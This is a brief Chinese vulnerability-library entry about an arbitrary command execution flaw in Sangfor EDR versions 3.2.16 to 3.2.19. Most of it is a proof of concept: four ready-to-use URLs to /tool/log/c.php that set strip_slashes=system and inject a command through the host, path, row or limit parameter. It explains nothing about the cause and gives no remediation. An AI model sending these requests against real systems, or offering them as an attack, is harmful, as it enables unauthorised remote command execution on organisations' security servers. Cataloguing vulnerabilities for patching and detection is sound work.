---
title: '深信服EDR任意命令执行漏洞'
date: Fri, 04 Sep 2020 05:26:04 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 漏洞范围

EDR 3.2.16、3.2.17、3.2.19

### 漏洞POC

参数host/path/row/limit=命令 即可执行命令

```
https://*****/tool/log/c.php?strip_slashes=system&host=id
https://*****/tool/log/c.php?strip_slashes=system&path=id
https://*****/tool/log/c.php?strip_slashes=system&row=id
https://*****/tool/log/c.php?strip_slashes=system&limit=id
```